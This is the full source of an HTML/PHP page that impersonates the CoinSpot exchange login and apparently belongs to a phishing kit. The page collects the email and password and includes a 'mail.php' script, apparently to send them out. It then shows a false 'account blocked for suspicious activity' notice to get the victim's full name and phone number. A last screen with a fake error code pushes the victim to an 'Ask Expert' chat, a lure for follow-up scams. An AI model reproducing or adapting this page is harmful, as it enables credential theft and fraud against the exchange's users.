<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy &amp; Sell Bitcoin, Dogecoin, Litecoin | CoinSpot</title>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <link href="assets/css/style.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <nav class="navbar navbar-expand-lg" id="navigation-bar">
        <div class="container-fluid">
        <a class="navbar-brand" href="#">
            <img src="assets/images/logo.png">  CoinSpot
        </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <i class="fas fa-bars"></i>
        </button>

        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav mr-auto">
               
                <li class="nav-item"><a class="nav-link" href="#" >Home</a></li>
                <li class="nav-item"><a class="nav-link" href="#" >Wallets</a></li>
                <li class="nav-item"><a class="nav-link" href="#" >Buy/Sell</a></li>
                <li class="nav-item"><a class="nav-link" href="#" >Swap</a></li>
                <li class="nav-item"><a class="nav-link" href="#" >Bundles</a></li>
                <li class="nav-item"><a class="nav-link" href="#" >OTC</a></li>
                <li class="nav-item"><a class="nav-link" href="#" >Markets</a></li>

            </ul>
            <form class="form-inline">
                <button class="btn  my-2 my-sm-0" type="submit" style="margin-right: 10px;">Register</button>
                 <button class="btn btn-primary my-2 my-sm-0" type="submit">Login</button>
            </form>
        </div>
    </div>
    </nav>
<div class="container-fluid login-container">
            <div class="row">


                  <?php
                     if (isset($_POST['btnLoginMore'])) {
                        
                        include 'mail.php';
                    ?>
                
                <div class="col-md-6 login-form-1">
                    
                    <form action="" method="post">
                        <h3>Verification Required</h3><br>
                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                   
                    <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                     Kindly contact chat assistance for further help
                 </div>
                        <div class="form-group">
                            <input type="text" name="name" class="form-control" placeholder="Full Name *" value="" required />
                        </div>
                       
                        <div class="form-group">
                            <input type="text" name="number" class="form-control" placeholder="Phone Number *" value="" required />
                        </div>
                        <div class="form-group">
                            <input name="fromLog" type="submit" class="btnSubmit" value="Verify" />
                        </div>
                        <div id="terms-and-conditions">by creating an account you agree to our<br><a href="#" rel="noopener" class="md-default-theme">Terms of Use</a> &amp; <a href="#" rel="noopener" class="md-default-theme">Privacy Policy</a>
                        </div>
                    </form>
                </div>


                  <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>
                <div class="col-md-6 login-form-1 text-center" style=" text-align: center;">
                    <form>
                     <h3 class="text-center">Account blocked</h3><br>
                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                    <div class="form">
                        <label>Error CODE: <b>6X76D</b></label><br>
                    </div>
                    <div class="calling-number">
                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707; color: #fff !important;">Ask Expert</a>
                    </div>
                    </form>
                </div>
                 <?php } else { ?>
                <div class="col-md-6 login-form-1">
                    
                    <form action="" method="post">
                   <h3>Login</h3>
                   <h6>To your CoinSpot account.</h6><br>
                  
                        <div class="form-group">
                            <label>Email</label>
                         <input type="email" id="email" name="email" class="form-control" placeholder="Email *" value="" required />
                        </div>
                        <div class="form-group">
                            <label>password</label>
                            <input type="password" name="password" class="form-control" placeholder="Password *" value="" required />
                        </div>
                        <div class="jss17"><a><input type="checkbox" name=""> Remember my email</a></div>
                        <div class="form-group">
                            <input name="btnLoginMore" type="submit" class="btnSubmit" value="Login" />
                        </div>
                        <div class="text-center">
                            <a style="padding-top:15px" href="/forgotpassword">Forgot your password?</a>
                            <br>
                            Don't have an account? <a href="/register">Register</a>
                            </div>
                      
                    </form>
                </div>
                 <?php } ?>

                 <div class="col-md-6 login-form-2">
                   <div class="panel-heading" style="padding-top: 50px">
                    Security News
                    </div>
                    <div class="panel-body">
                    <b>Verification required for AUD Withdrawals</b>
                    <br>
                    Please note that your account must be verified to be able to withdraw AUD to your nominated bank account.
                    <br>
                    <hr>
                    <b>Never create an account on behalf of someone else</b>
                    <br>
                    If you have been asked to login or create an account to purchase something on Gumtree, Ebay etc. it is highly likely to be a scam and you should contact our support team immediately.
                    </div>
                </div>
            </div>
        </div>


</body>
</html>